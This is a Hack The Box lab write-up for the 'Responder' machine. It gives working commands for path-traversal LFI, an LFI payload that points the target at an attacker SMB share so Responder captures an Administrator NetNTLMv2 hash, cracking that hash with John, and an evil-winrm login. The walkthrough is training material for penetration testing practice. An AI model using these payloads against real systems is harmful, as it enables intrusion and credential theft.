Responder is a beginner-friendly Windows machine on Hack The Box that focuses on Local File Inclusion (LFI), SMB authentication abuse, NetNTLMv2 hash capture, password cracking, and WinRM access.

The machine started with an Nmap scan to identify open ports and running services:

```bash
nmap -p- --min-rate 1000 -sV <IP>
```

The scan revealed two important services:

* Port `80` running **Apache httpd**
* Port `5985` running **WinRM**

The web application redirected requests to the hostname `unika.htb`, indicating that the server was using name-based virtual hosting.

To resolve the hostname locally, an entry was added to the `/etc/hosts` file:

```bash
echo "<TARGET-IP> unika.htb" | sudo tee -a /etc/hosts
```

---

# Web Enumeration

After accessing the website, a language selection feature was observed. Changing the language parameter modified the page value in the URL:

```text
/index.php?page=french.html
```

This suggested a possible Local File Inclusion (LFI) vulnerability.

The vulnerability was tested by attempting to access the Windows hosts file:

```bash
http://unika.htb/index.php?page=../../../../../../../../windows/system32/drivers/etc/hosts
```

![alt text](<Screenshot 2026-05-15 232010.png>)

The contents of the file were successfully displayed, confirming that the application was vulnerable to LFI.

---

# Responder Exploitation

Since the target machine was Windows-based, the LFI vulnerability was leveraged to force SMB authentication to the attacker's machine.

Responder was started to capture NetNTLMv2 authentication hashes:

```bash
sudo responder -I tun0
```

The following payload was used in the browser:

```bash
http://unika.htb/?page=//<ATTACKER-IP>/share
```

![alt text](<Screenshot 2026-05-16 000822.png>)

The server attempted to access the SMB share, causing the Windows machine to authenticate to the attacker's system.

Responder successfully captured a NetNTLMv2 hash for the `Administrator` user.

---

# Hash Cracking

The captured hash was saved into a file and cracked using John the Ripper:

```bash
john -w=/usr/share/wordlists/rockyou.txt hash.txt
```

The password was successfully recovered.

---

# WinRM Access

Using the cracked credentials, remote access was obtained through Evil-WinRM:

```bash
evil-winrm -i <TARGET-IP> -u administrator -p <PASSWORD>
```

After successful authentication, a PowerShell session was established on the target machine.

The flag was located and captured successfully.


![alt text](<Screenshot 2026-05-16 000917.png>)
---

# Key Learnings

* Performing service enumeration using Nmap
* Understanding name-based virtual hosting
* Exploiting Local File Inclusion (LFI)
* Capturing NetNTLMv2 hashes using Responder
* Understanding SMB authentication abuse
* Password cracking using John the Ripper
* Remote administration using WinRM
* Windows-based attack methodology

---

# Skills Practiced

* Windows Enumeration
* Web Application Enumeration
* Local File Inclusion (LFI)
* SMB Exploitation
* NetNTLMv2 Hash Capture
* Password Cracking
* WinRM Access
* Post Authentication Enumeration

---

